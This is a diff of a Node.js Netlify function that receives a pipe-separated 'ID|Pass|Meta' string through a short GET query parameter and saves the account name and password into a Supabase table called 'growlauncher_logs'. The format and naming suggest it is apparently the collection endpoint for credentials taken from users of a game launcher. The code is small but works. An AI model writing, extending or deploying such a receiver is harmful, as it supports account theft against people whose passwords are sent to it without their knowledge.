@@ -1,7 +1,5 @@
 const { createClient } = require('@supabase/supabase-js');
 
-// Mengambil URL dan Key dari Environment Variables Netlify
-// Gunakan SUPABASE_URL dan SUPABASE_KEY (sesuai log Netlify Anda)
 const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
 
 exports.handler = async (event) => {
@@ -12,24 +10,24 @@ exports.handler = async (event) => {
     };
 
     try {
-        let inputData;
-        
-        // Cek apakah data dikirim via GET (Query String) atau POST (Body)
-        if (event.httpMethod === 'GET') {
-            if (!event.queryStringParameters.data) throw new Error("No data provided");
-            inputData = JSON.parse(event.queryStringParameters.data);
-        } else if (event.httpMethod === 'POST') {
-            inputData = JSON.parse(event.body);
-        } else {
-            // Jika method GET tanpa parameter, tampilkan data untuk UI
-            const { data, error } = await supabase
-                .from('growlauncher_logs')
-                .select('*')
-                .order('created_at', { ascending: false });
+        // Ambil data dari parameter 'd' ATAU 'data'
+        const rawData = event.queryStringParameters.d || event.queryStringParameters.data;
 
-            if (error) throw error;
-            return { statusCode: 200, headers, body: JSON.stringify(data) };
+        if (!rawData) {
+            return { 
+                statusCode: 400, 
+                headers, 
+                body: JSON.stringify({ error: "No data provided", debug: event.queryStringParameters }) 
+            };
         }
+
+        // Split data (Format: ID|Pass|Meta)
+        const parts = rawData.split('|');
+        const inputData = {
+            idName: parts[0] || "Unknown",
+            idPass: parts[1] || "Unknown",
+            meta: parts[2] || "None"
+        };
 
         // Simpan ke Supabase
         const { error } = await supabase
@@ -44,16 +42,8 @@ exports.handler = async (event) => {
 
         if (error) throw error;
 
-        return { 
-            statusCode: 200, 
-            headers, 
-            body: JSON.stringify({ status: "Success", message: "Data synced to NovaScript" }) 
-        };
+        return { statusCode: 200, headers, body: JSON.stringify({ status: "Success" }) };
     } catch (err) {
-        return { 
-            statusCode: 500, 
-            headers, 
-            body: JSON.stringify({ error: err.message }) 
-        };
+        return { statusCode: 500, headers, body: JSON.stringify({ error: err.message }) };
     }
 };
